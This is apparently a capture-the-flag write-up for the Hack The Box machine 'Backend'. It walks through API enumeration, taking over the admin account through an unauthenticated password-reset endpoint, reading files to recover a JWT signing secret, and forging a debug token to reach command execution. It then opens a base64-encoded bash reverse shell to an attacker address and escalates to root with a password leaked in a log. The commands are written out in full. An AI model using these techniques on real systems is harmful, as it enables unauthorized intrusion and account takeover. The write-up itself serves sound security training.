[HTB: Backend](#)




![](/img/backend-cover.png)

Backend was all about enumerating and abusing an API, first to get
access to the Swagger docs, then to get admin access, and then debug
access. From there it allows execution of commands, which provides a
shell on the box. To escalate to root, I'll find a root password in the
application logs where the user must have put in their password to the
name field.

### nmap

`nmap` finds two open TCP ports, SSH (22) and HTTP (80):

### Website - TCP 80

#### Site

Visiting the page returns JSON data that Firefox displays:

![](/img/image-20220411112833859.png)

With `curl`, it's even clearer how simple the response is:



    oxdf@hacky$ curl 10.10.11.161
    {"msg":"UHC API Version 1.0"}



#### Tech Stack

The response headers show "uvicorn":



    HTTP/1.1 200 OK
    date: Mon, 11 Apr 2022 19:40:34 GMT
    server: uvicorn
    content-length: 29
    content-type: application/json
    Connection: close

    {"msg":"UHC API Version 1.0"}



`uvicorn` is a web server for hosting Python webservers, so that's a
good hint as to what kind of framework is running here. It could be
Flask or Django, but it's likely FastAPI.

#### API Brute Force

I can use my standard `feroxbuster` run against the site, but the
default is much more tuned for finding pages on a website than finding
API endpoints. For example, the default `feroxbuster` finds:



    oxdf@hacky$ feroxbuster -u http://10.10.11.161

    [####################] - 2m     29999/29999   247/s   http://10.10.11.161 



The 401 on `/docs` is an Unauthorized response. I need more access to
get to the docs.

`feroxbuster` doesn't recurrse down `/api`, though there's almost
certainly more there. That's because `feroxbuster` only recurrses based
on 2XX or 403 status code plus url ends in `/`, or 3xx (redirect) status
code to the same locations with a trailing `/`. So when `/api` doesn't
end in a `/`, it doesn't recurse (see the [feroxbuster
update](#feroxbuster-updates) section later).

#### /api

Visiting `/api` returns a list of endpoints, in this case, containing
one, `v1`:

![](/img/image-20220411144907095.png)

`/api/v1` shows two more endpoints:

![](/img/image-20220411144932854.png)

`/api/v1/admin` redirects to `/api/v1/admin/`, which then returns 401
Unauthorized. The redirect seems to be hinting that there's more down
this path, but that I'm not authorized to go.

Strangely, `/admin/v1/user` returns 404 not found. Adding a trailing `/`
doesn't change this. There's likely more here as well.

#### Brute Force Strategy

When trying different endpoints here, I don't know of a single nice tool
for this. `feroxbuster` is nice because it let's you give multiple HTTP
methods, and it's fast. But you have to identify status codes you want
to see. There's no way to say "show me everything that isn't 404". Based
on some issues I was having on this box, the author of `feroxbuster`
actually added some features, which aren't quite live yet, but will be
any day, and I'll cover those [here](#feroxbuster-updates).

When I was drafting this port originally, `wfuzz` gave much nicer
granularity on what is displayed/filtered. Still, it's much slower, and
I'll have to run it three times to do three different HTTP verbs.

It's worth understanding the how each tool you use works so that when
you collect information, you know exactly what it's telling you, and
what it might have missed.

#### /api/v1/admin Brute Force

Turning `feroxbuster` on this endpoint, I'll have `feroxbuster` try GET,
POST, and PUT requests. IT finds one new endpoint:



    oxdf@hacky$ feroxbuster -u http://10.10.11.161/api/v1/admin/ -m GET,POST,PUT

    [####################] - 6m     89997/89997   235/s   http://10.10.11.161/api/v1/admin/ 



`/file` is a Method Not Allowed response. Trying with `curl` shows the
same:



    oxdf@hacky$ curl http://10.10.11.161/api/v1/admin/file
    {"detail":"Method Not Allowed"}



Switching from GET, PUT returns the same, but POST returns Not
Authenticated:



    oxdf@hacky$ curl http://10.10.11.161/api/v1/admin/file -X PUT
    {"detail":"Method Not Allowed"}
    oxdf@hacky$ curl http://10.10.11.161/api/v1/admin/file -X POST
    {"detail":"Not authenticated"}



That seems to be a real endpoint to keep in mind.

#### /api/v1/user Brute Force

The default response for `/api/v1/user/FUZZ` is a 422 Unprocessable
Entity:



    000000001:   422        0 L      6 W      104 Ch      "cgi-bin"



Lookign at that endpoint in Firefox, it shows some information about the
expected value there:

![](/img/image-20220411151549634.png)

On first writing this post, `feroxbuster` didn't have a way to show all
responses except for a given list of codes, and I put in [this
issue](https://github.com/epi052/feroxbuster/issues/535).
[epi](https://twitter.com/epi052) actually reached out a few hours later
with a version that should be out soon that does what I've asked, so
I'll show `feroxbuster` in the next section as well.

With `wfuzz`, hiding 422 responses:



    oxdf@hacky$ wfuzz -u http://10.10.11.161/api/v1/user/FUZZ -w /usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt --hc 422

    Finishing pending requests...



I'll kill that after a minute. It seems that any integer is returning
200, and most of 4 characters long. These are returning `null`:

![](/img/image-20220411151755631.png)

There are two users on the box with non-null responses:



    oxdf@hacky$ curl -s http://10.10.11.161/api/v1/user/1 | jq .
    {
      "guid": "36c2e94a-4271-4259-93bf-c96ad5948284",
      "email": "admin@htb.local",
      "date": null,
      "time_created": 1649533388111,
      "is_superuser": true,
      "id": 1
    }
    oxdf@hacky$ curl -s http://10.10.11.161/api/v1/user/2 | jq .
    {
      "guid": "3c0d83a0-877a-46e5-bd01-18908f6ebee6",
      "email": "root@ippsec.rocks",

      "time_created": 1649717405121,
      "is_superuser": false,
      "id": 2
    }



User with id 1 is the admin, and is a superuser.

I can't find much else here with a GET, but it's important to check
other methods as well. Starting fresh, I'll look at POST request, and it
seems like the default is a 405 Method not allowed. I'll hide those
(`--hc 405`), and run:



    oxdf@hacky$ wfuzz -X POST -u http://10.10.11.161/api/v1/user/FUZZ -w /usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt --hc 405

Pretty quickly some interesting endpoints come back, like `/login` and
`/signup` (the rest were false positives).

#### feroxbuster Updates

[epi](https://twitter.com/epi052) updated `feroxbuster` based on the
issues I was having on Backend. Using a preview build of a soon to be
released version, I'll show some of the same enumeration as above. For
the `user` path, I'll start with just ignoring HTTP 404s (because the
path doesn't exist), and quickly find a few other things that need
ruling out:

-   The 422s that of 104 characters for GET requests that aren't
    numeric.
-   The 4 character `null` responses for numbers that don't have a user.
-   405s on POST requests to `/api/v1/user/[non-numeric]`.

It's worth thinking about how to filter. I 404 seems like an obvious
filter - I don't want things that don't exist. I could go either way
with 405. In this case, it generates a ton of false positives on the GET
request, so I'm going to ignore it. However, I could also break GET and
POST into separate runs and just ignore it on GET. I could filter 422,
but that's potentially more errors than just what I'm seeing on the
non-numeric GET. If it finds some other endpoint that the parameters are
wrong for, I don't want to miss that, so I'll filter that one by
character length instead.

Those decisions lead to this run with `-C 404,405 -m GET,POST -S 4,104`:



    oxdf@hacky$ ./feroxbuster -u http://10.10.11.161/api/v1/user -C 404,405 -m GET,POST -S 4,104

Finds the existing users (my user registered later is id 3), as well as
`login` and `signup`!

There's also now a `--force-recursion` switch, which will recurse down
anything that matches the filter, instead of only things that look like
directories. If I start with this at `/api`, it will find `admin` and
even the `file` endpoint, but not the `user` path, as that returns 404.

All of which is to say, these are useful options to have, and you still
want to know what you're tools are doing when enumerating an API.

### Access Docs

#### Register

I'll switch to `curl` and try a POST to `/api/v1/user/signup`:



    oxdf@hacky$ curl -v http://10.10.11.161/api/v1/user/signup -X POST
    *   Trying 10.10.11.161:80...
    * TCP_NODELAY set
    * Connected to 10.10.11.161 (10.10.11.161) port 80 (#0)
    > POST /api/v1/user/signup HTTP/1.1
    > Host: 10.10.11.161
    > User-Agent: curl/7.68.0
    > Accept: */*
    > 
    * Mark bundle as not supporting multiuse
    < HTTP/1.1 422 Unprocessable Entity
    < date: Mon, 11 Apr 2022 23:52:13 GMT
    < server: uvicorn
    < content-length: 81
    < content-type: application/json
    < 
    * Connection #0 to host 10.10.11.161 left intact
    {"detail":[{"loc":["body"],"msg":"field required","type":"value_error.missing"}]}



It returns 422 Unprocessable Entity, and the message say a field is
required in the body. It's more clear using `jq` to print the results:



    oxdf@hacky$ curl http://10.10.11.161/api/v1/user/signup -X POST -s | jq .
    {
      "detail": [
        {
          "loc": [
            "body"
          ],
          "msg": "field required",
          "type": "value_error.missing"
        }
      ]
    }



I'll try adding a POST body, and there's a new message:



    oxdf@hacky$ curl -s -X POST -d '0xdf' http://10.10.11.161/api/v1/user/signup | jq .
    {
      "detail": [
        {
          "loc": [
            "body"
          ],
          "msg": "value is not a valid dict",
          "type": "type_error.dict"
        }
      ]
    }



Knowing this is a Python webserver, I'll switch to JSON and give it a
dict, which is of the format `{"key": "value"}`.



    oxdf@hacky$ curl -s -X POST -d '{"key": "value"}' http://10.10.11.161/api/v1/user/signup | jq .
    {
      "detail": [
        {
          "loc": [
            "body"
          ],
          "msg": "value is not a valid dict",
          "type": "type_error.dict"
        }
      ]
    }



It gave the same response. That's because for it to process JSON, I have
to give a `Content-Type` header that says the body is JSON. That brings
the next message:



    oxdf@hacky$ curl -s -X POST -d '{"key": "value"}' http://10.10.11.161/api/v1/user/signup -H "Content-Type: application/json" | jq .
    {
      "detail": [
        {
          "loc": [
            "body",
            "email"
          ],
          "msg": "field required",
          "type": "value_error.missing"
        },
        {
          "loc": [
            "body",
            "password"
          ],
          "msg": "field required",
          "type": "value_error.missing"
        }
      ]
    }



It's missing "body/email" and "body/password". It's not exactly clear
where those go, but I'm able to get it pretty quickly:



    oxdf@hacky$ curl -v -s -X POST -d '{"email": "0xdf@htb.htb", "password": "0xdf0xdf"}' http://10.10.11.161/api/v1/user/signup -H "Content-Type: application/json" | jq .
    *   Trying 10.10.11.161:80...
    * TCP_NODELAY set
    * Connected to 10.10.11.161 (10.10.11.161) port 80 (#0)
    > POST /api/v1/user/signup HTTP/1.1
    > Host: 10.10.11.161
    > User-Agent: curl/7.68.0
    > Accept: */*
    > Content-Type: application/json
    > Content-Length: 49
    > 
    } [49 bytes data]
    * upload completely sent off: 49 out of 49 bytes
    * Mark bundle as not supporting multiuse
    < HTTP/1.1 201 Created
    < date: Mon, 11 Apr 2022 23:58:06 GMT
    < server: uvicorn
    < content-length: 2
    < content-type: application/json
    < 
    { [2 bytes data]
    * Connection #0 to host 10.10.11.161 left intact
    {}



The response is a 201 Created, and it returns an empty dict.

#### Login

If that worked and I have an account, I'll try a similar methodology on
the `/api/v1/user/login` endpoint. This one goes right to is missing
username and password, without first complaining about the lack of a
body or that the body isn't a `dict`:



    oxdf@hacky$ curl -s -X POST http://10.10.11.161/api/v1/user/login | jq .
    {
      "detail": [
        {
          "loc": [
            "body",
            "username"
          ],
          "msg": "field required",
          "type": "value_error.missing"
        },
        {
          "loc": [
            "body",
            "password"
          ],
          "msg": "field required",
          "type": "value_error.missing"
        }
      ]
    }



I'll assume username is the email I gave on registering. My first
thought was to try just what I did above:



    oxdf@hacky$ curl -s -d '{"username": "0xdf@htb.htb", "password": "0xdf0xdf"}' -X POST http://10.10.11.161/api/v1/user/login -H "Content-Type: application/json" | jq .
    {
      "detail": [
        {
          "loc": [
            "body",
            "username"
          ],
          "msg": "field required",
          "type": "value_error.missing"
        },
        {
          "loc": [
            "body",
            "password"
          ],
          "msg": "field required",
          "type": "value_error.missing"
        }
      ]
    }



It doesn't work.

Given the different error messages, perhaps it's set to use a standard
HTTP body. That worked:



    oxdf@hacky$ curl -s -d 'username=0xdf@htb.htb&password=0xdf0xdf' http://10.10.11.161/api/v1/user/login | jq .
    {
      "access_token": "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ0eXBlIjoiYWNjZXNzX3Rva2VuIiwiZXhwIjoxNjUwNDEzMTMwLCJpYXQiOjE2NDk3MjE5MzAsInN1YiI6IjMiLCJpc19zdXBlcnVzZXIiOmZhbHNlLCJndWlkIjoiNTg4MjI2N2YtYTA2My00MzZiLWE5NmUtNTIyZjk2ZjNkOTY5In0.Y6OfDmvwWEHsZhtwxZqN2X6-q29B5C2dYDRIhOik_jo",
      "token_type": "bearer"
    }



It returned an access token of the type bearer.

#### Use Token

The token looks to be a JWT token (though it could be a flask cookie).
The quickest way to check is to drop it into [jwt.io](https://jwt.io/)
and see that it is a JWT:

![image*](/img/image-20220411155743806.png)

The standard way to use a bearer token is to include an `Authorization`
header, with the string `bearer [token]`. That works here as I can now
access `/docs`:



    oxdf@hacky$ curl http://10.10.11.161/docs -H "Authorization: bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ0eXBlIjoiYWNjZXNzX3Rva2VuIiwiZXhwIjoxNjUwNDEzMTMwLCJpYXQiOjE2NDk3MjE5MzAsInN1YiI6IjMiLCJpc19zdXBlcnVzZXIiOmZhbHNlLCJndWlkIjoiNTg4MjI2N2YtYTA2My00MzZiLWE5NmUtNTIyZjk2ZjNkOTY5In0.Y6OfDmvwWEHsZhtwxZqN2X6-q29B5C2dYDRIhOik_jo"

#### Use In Firefox

The docs look to be JavaScript generated. To see them, I'll want to get
in with Firefox. One way is to add a plugin like
[simple-modify-headers](https://addons.mozilla.org/en-US/firefox/addon/simple-modify-header/).
I'll configure it for Backend, and turn it on:

![](/img/image-20220411160523272.png)

The other way would be to just catch the request for `/docs` in Burp,
and add the header. There's actually a second request to `/openapi.json`
which needs the auth as well. After adding that to both, the page will
load.

Either way the docs page can be accessed:


[![](/img/image-20220411160722892.png)](/img/image-20220411160722892.png)


[*Click for full
![image*](/img/image-20220411160722892.png)



### Admin Access

#### Docs

The docs generated by Swagger for FastAPI are fully interactive. If I
expand one of the API endpoints, and click "Try It Out" and then
Execute", it will run the endpoint, showing both the request and
response:

![](/img/image-20220411170317575.png)

Some of the endpoints have locks next to them:

![](/img/image-20220411170354018.png)

Clicking on the doc will pop a form where I can login:

![](/img/image-20220411170421737.png)

Now these endpoints will run from within the docs as well.

#### Enumerate API Endpoints

Looking through all the endpoints, they are broken into three groups.
default has the docs, and `/api`, and `/api/v1`. Nothing really
interesting here.

user has `/api/v1/user` endpoints, including `{user_id}` to get a user,
`login`, and `signup`, that I've enumerated already, as well as a couple
more.

![](/img/image-20220411171412351.png)

There's also an admin section which includes the `file` endpoint
`feroxbuster` found, and two others:

![](/img/image-20220411171754313.png)

#### admin Endpoints

All three of these require auth, but since I have auth, I'll give them a
try. First there's "Admin Check" (`/api/v1/admin/`), which:

> Returns true if the user is admin

Unsurprisingly, it returns false:

![](/img/image-20220411171958857.png)

"Get File" (`/api/v1/admin/file`) is next, and it:

> Returns a file on the server

I'll give it `/etc/passwd`, but it returns a permission error:

![](/img/image-20220411172347159.png)

It seems like I need admin privs to use this (which makes sense).

"Run Command" (`/api/v1/admin/exec/{command}`) says it:

> Executes a command. Requires Debug Permissions.

Running it returns a 400 Bad Request:

![](/img/image-20220411173139825.png)

It seems to use `exec` I'll need an updated JWT.

#### user Endpoints

The only two user end point I haven't looked at are `SecretFlagEndpoint`
and `updatepass`.

"Get Flag" (`/api/v1/user/SecretFlagEndpoint`) takes no input and
returns a string:

![](/img/image-20220411170620487.png)

On trying it, it returns `user.txt`:

![](/img/image-20220411170713345.png)

"Update Password" (`/api/v1/user/updatepass`) takes a JSON body with
`guid` and `password`:

![](/img/image-20220411171500284.png)

This endpoint doesn't even seem to need auth!? I'll fetch the admin's
guid using the "Fetch User" endpoint:



    oxdf@hacky$ curl -s http://10.10.11.161/api/v1/user/1 | jq .
    {
      "guid": "36c2e94a-4271-4259-93bf-c96ad5948284",
      "email": "admin@htb.local",
      "date": null,
      "time_created": 1649533388111,
      "is_superuser": true,
      "id": 1
    }



Clicking "Try It Out" pops a field to input the JSON body, which I'll
fill out with the `guid` for the admin user and a new `password`, and
hit "Execute". It returns a 201:

![](/img/image-20220411173908260.png)

Looking down a bit at the documentation, 201 is success:

![](/img/image-20220411173929182.png)

I'll head back up to the "Authorize" button, and this time give it the
admin info (with the newly set password):

![](/img/image-20220411174017081.png)

On clicking "Authorize", it seems to work:

![](/img/image-20220411174033160.png)

Now `/api/v1/admin/` confirms it:

![](/img/image-20220411174201449.png)

### Debug Access

#### File Read

From here, I still get the same error on `/api/v1/admin/exec/{command}`.
But I can now read files:

![](/img/image-20220411174303071.png)

I'll switch to `curl` with `jq` to print files:



    oxdf@hacky$ curl -s 'http://10.10.11.161/api/v1/admin/file' -H 'Authorization: Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ0eXBlIjoiYWNjZXNzX3Rva2VuIiwiZXhwIjoxNjUwNDE5NTQ0LCJpYXQiOjE2NDk3MjgzNDQsInN1YiI6IjEiLCJpc19zdXBlcnVzZXIiOnRydWUsImd1aWQiOiIzNmMyZTk0YS00MjcxLTQyNTktOTNiZi1jOTZhZDU5NDgyODQifQ.gv-3xaN_zUwMcLcLbxBUSmvJnJC3g4raKl9AJip19gU' -H 'Content-Type: application/json' -d '{"file": "/etc/passwd"}' | jq -r '.file'

    sys:x:3:3:sys:/dev:/usr/sbin/nologin
    ...[snip]...



To get the location of the web server code, I'll read the environment of
the current process at `/proc/self/environ`:



    oxdf@hacky$ curl -s 'http://10.10.11.161/api/v1/admin/file' -H 'Authorization: Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ0eXBlIjoiYWNjZXNzX3Rva2VuIiwiZXhwIjoxNjUwNDE5NTQ0LCJpYXQiOjE2NDk3MjgzNDQsInN1YiI6IjEiLCJpc19zdXBlcnVzZXIiOnRydWUsImd1aWQiOiIzNmMyZTk0YS00MjcxLTQyNTktOTNiZi1jOTZhZDU5NDgyODQifQ.gv-3xaN_zUwMcLcLbxBUSmvJnJC3g4raKl9AJip19gU' -H 'Content-Type: application/json' -d '{"file": "/proc/self/environ"}' | jq -r '.file'

It's a bit jammed together, but the first two are:



    APP_MODULE=app.main:app
    PWD=/home/htb/uhc



That says the working directory is `/home/htb/uhc`, and that the app is
located likely in `app/main.py`. I'll give that a try, and it works:



    oxdf@hacky$ curl -s 'http://10.10.11.161/api/v1/admin/file' -H 'Authorization: Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ0eXBlIjoiYWNjZXNzX3Rva2VuIiwiZXhwIjoxNjUwNDE5NTQ0LCJpYXQiOjE2NDk3MjgzNDQsInN1YiI6IjEiLCJpc19zdXBlcnVzZXIiOnRydWUsImd1aWQiOiIzNmMyZTk0YS00MjcxLTQyNTktOTNiZi1jOTZhZDU5NDgyODQifQ.gv-3xaN_zUwMcLcLbxBUSmvJnJC3g4raKl9AJip19gU' -H 'Content-Type: application/json' -d '{"file": "/home/htb/uhc/app/main.py"}' | jq -r '.file'
    import asyncio
                                                                                                                                            
    from fastapi import FastAPI, APIRouter, Query, HTTPException, Request, Depends
    from fastapi_contrib.common.responses import UJSONResponse
    from fastapi import FastAPI, Depends, HTTPException, status
    ...[snip]...



#### Source Analysis

The various "default" endpoints are defined in this file. For example:



    @app.get("/api", status_code=200)
    def list_versions():
        """
        Versions
        """
        return {"endpoints":["v1"]}



The `user` and `admin` routes are not, they are imported here:



    app.include_router(api_router, prefix=settings.API_V1_STR)



`api_router` is imported at the top:



    from app.api.v1.api import api_router                     



When I import like this, it could be importing the entire
`api_router.py` file from `app/api/v1/api`, or it could be that
`api_router` is an object defined in `app/api/v1/api.py`. I'll find it
at `/home/htb/uhc/app/api/v1/api.py`:



    from fastapi import APIRouter

    from app.api.v1.endpoints import user, admin


    api_router = APIRouter()
    api_router.include_router(user.router, prefix="/user", tags=["user"])
    api_router.include_router(admin.router, prefix="/admin", tags=["admin"])



This time the import is getting entire files. I can read `user.py` and
`admin.py` from `/home/htb/uhc/app/api/v1/endpoints/`.

The function I'm most interested in is `exec`, which is in `admin.py`:



    @router.get("/exec/{command}", status_code=200)
    def run_command(
        command: str,
        current_user: User = Depends(deps.parse_token),
        db: Session = Depends(deps.get_db)
    ) -> str:
        """
        Executes a command. Requires Debug Permissions.
        """
        if "debug" not in current_user.keys():
            raise HTTPException(status_code=400, detail="Debug key missing from JWT")

        import subprocess

        return subprocess.run(["/bin/sh","-c",command], stdout=subprocess.PIPE).stdout.strip()



The `current_user` object is loaded from `deps.parse_token`. `deps` is
imported at the top of the file:



    from app.api import deps 



I'll find the `parse_token` function in `/home/htb/uhc/app/api/deps.py`:



    async def parse_token(
        token: str = Depends(oauth2_scheme)
    ) -> User:
        credentials_exception = HTTPException(
            status_code=status.HTTP_401_UNAUTHORIZED,
            detail="Could not validate credentials",
            headers={"WWW-Authenticate": "Bearer"},
        )
        try:
            payload = jwt.decode(
                token,
                settings.JWT_SECRET,
                algorithms=[settings.ALGORITHM],
                options={"verify_aud": False},
            )

        except JWTError:
            raise credentials_exception
            
        return payload



It's getting the JWT, decoding it, and returning a dictionary.

#### Forge Cookie

With all the analysis above, it's clear that to get debug privilieges, I
just need to have a valid JWT with `debug` as a key (and any value).
When the token is passed to `jwt.decode` above, the secret is in
`settings.JWT_SECRET`, and `settings` is imported here:



    from app.core.config import settings      



Fetching `/home/htb/uhc/app/core/config.py` includes the key and the
algorithm:



        JWT_SECRET: str = "SuperSecretSigningKey-HTB"
        ALGORITHM: str = "HS256"



My preferred way to forge JWT tokens is with the PyJWT library in a
Python terminal. I'll drop in and save my strings to variables:



    oxdf@hacky$ python3
    Python 3.8.10 (default, Mar 15 2022, 12:22:08) 
    [GCC 9.4.0] on linux
    Type "help", "copyright", "credits" or "license" for more information.
    >>> import jwt
    >>> token = "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ0eXBlIjoiYWNjZXNzX3Rva2VuIiwiZXhwIjoxNjUwNDE5NTQ0LCJpYXQiOjE2NDk3MjgzNDQsInN1YiI6IjEiLCJpc19zdXBlcnVzZXIiOnRydWUsImd1aWQiOiIzNmMyZTk0YS00MjcxLTQyNTktOTNiZi1jOTZhZDU5NDgyODQifQ.gv-3xaN_zUwMcLcLbxBUSmvJnJC3g4raKl9AJip19gU"
    >>> secret = "SuperSecretSigningKey-HTB"



Now I can get the decoded cookie:



    >>> decoded = jwt.decode(token, secret, ["HS256"])
    >>> decoded
    {'type': 'access_token', 'exp': 1650419544, 'iat': 1649728344, 'sub': '1', 'is_superuser': True, 'guid': '36c2e94a-4271-4259-93bf-c96ad5948284'}



I'll add the `debug` parameter to the data, and re-encode:



    >>> decoded["debug"] = True
    >>> jwt.encode(decoded, secret, "HS256")
    'eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJ0eXBlIjoiYWNjZXNzX3Rva2VuIiwiZXhwIjoxNjUwNDE5NTQ0LCJpYXQiOjE2NDk3MjgzNDQsInN1YiI6IjEiLCJpc19zdXBlcnVzZXIiOnRydWUsImd1aWQiOiIzNmMyZTk0YS00MjcxLTQyNTktOTNiZi1jOTZhZDU5NDgyODQiLCJkZWJ1ZyI6dHJ1ZX0.-Lm7PBveaoEM5F46H5KWETGixBj1hp4_UNppFLFozDo'



#### Run Command

I'll go into the docs and execute `exec`, knowing it'll fail, but I can
grab the `curl` command from there. I'll paste that into a new terminal,
replacing the token with the new forged one (and clean it up a bit, and
use `jq -r .` to make the result print nicely), and it works:



    oxdf@hacky$ curl -s http://10.10.11.161/api/v1/admin/exec/id -H 'Authorization: Bearer eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJ0eXBlIjoiYWNjZXNzX3Rva2VuIiwiZXhwIjoxNjUwNDE5NTQ0LCJpYXQiOjE2NDk3MjgzNDQsInN1YiI6IjEiLCJpc19zdXBlcnVzZXIiOnRydWUsImd1aWQiOiIzNmMyZTk0YS00MjcxLTQyNTktOTNiZi1jOTZhZDU5NDgyODQiLCJkZWJ1ZyI6dHJ1ZX0.-Lm7PBveaoEM5F46H5KWETGixBj1hp4_UNppFLFozDo' | jq -r .
    uid=1000(htb) gid=1000(htb) groups=1000(htb),4(adm),24(cdrom),27(sudo),30(dip),46(plugdev),116(lxd)



### Shell

I can't have a `/` in my command or it will go to another endpoint, so
the safest thing to do is just base64-encode a [bash reverse
shell](https://www.youtube.com/watch?v=OjkVep2EIlw):



    oxdf@hacky$ echo 'bash -c "bash  -i >& /dev/tcp/10.10.14.6/443 0>&1"' | base64
    YmFzaCAtYyAiYmFzaCAgLWkgPiYgL2Rldi90Y3AvMTAuMTAuMTQuNi80NDMgMD4mMSIK



Next I'll take the command and replace the spaces with `%20`, and there
are no other special characters, so I can submit like this:



    oxdf@hacky$ curl -s 'http://10.10.11.161/api/v1/admin/exec/echo%20YmFzaCAtYyAiYmFzaCAgLWkgPiYgL2Rldi90Y3AvMTAuMTAuMTQuNi80NDMgMD4mMSIK|base64%20-d|bash' -H 'Authorization: Bearer eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJ0eXBlIjoiYWNjZXNzX3Rva2VuIiwiZXhwIjoxNjUwNDE5NTQ0LCJpYXQiOjE2NDk3MjgzNDQsInN1YiI6IjEiLCJpc19zdXBlcnVzZXIiOnRydWUsImd1aWQiOiIzNmMyZTk0YS00MjcxLTQyNTktOTNiZi1jOTZhZDU5NDgyODQiLCJkZWJ1ZyI6dHJ1ZX0.-Lm7PBveaoEM5F46H5KWETGixBj1hp4_UNppFLFozDo'



When I do, there's a connection at a listening `nc`:



    oxdf@hacky$ nc -lnvp 443
    Listening on 0.0.0.0 443
    Connection received on 10.10.11.161 35776
    bash: cannot set terminal process group (672): Inappropriate ioctl for device
    bash: no job control in this shell
    htb@Backend:~/uhc$ 



I'll upgrade the shell using the standard script trick:



    htb@Backend:~/uhc$ script /dev/null -c bash
    script /dev/null -c bash
    Script started, file is /dev/null
    htb@Backend:~/uhc$ ^Z
    [1]+  Stopped                 nc -lnvp 443
    oxdf@hacky$ stty raw -echo;fg
    nc -lnvp 443
                reset
    reset: unknown terminal type unknown
    Terminal type? screen
    htb@Backend:~/uhc$



## Shell as root

### Enumeration

The `uhc` directory is mostly set up for the application, but there's
also an `auth.log` file:



    htb@Backend:~/uhc$ ls
    __pycache__  app         poetry.lock      pyproject.toml    uhc.db
    alembic      auth.log    populateauth.py  requirements.txt
    alembic.ini  builddb.sh  prestart.sh      run.sh



Looking at it, my activity appears at the bottom, but also, there's a
bunch of admin logins, along with a single failure:



    htb@Backend:~/uhc$ cat auth.log

"Tr0ub4dor&3" doesn't look like a valid username (all the others are
emails, except for some of my failures). Its possible that the admin put
their password in instead of the username one time.

### su

That does in fact work as the root password:



    htb@Backend:~/uhc$ su -
    Password: 
    root@Backend:~#



And I can read `root.txt`:



    root@Backend:~# cat root.txt
